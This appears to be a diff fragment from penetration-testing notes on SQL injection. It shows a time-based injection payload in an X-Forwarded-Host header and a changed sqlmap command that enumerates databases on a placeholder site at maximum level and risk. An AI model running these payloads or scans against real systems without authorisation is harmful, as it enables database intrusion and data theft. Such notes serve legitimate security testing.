@@ -54,7 +54,7 @@ X-Forwarded-Host: "' or sleep(30)='"
 
 
 ```
-python3 [sqlmap.py](http://sqlmap.py) -u "https://www[.]example[.]com/something/thing/filter-thing.php?vulnerable-param=123& another-param=123" --dbs --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
+sqlmap -u "https://www[.]example[.]com/something/thing/filter-thing.php?vulnerable-param=123& another-param=123" --dbs --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
 ```
 
 ```
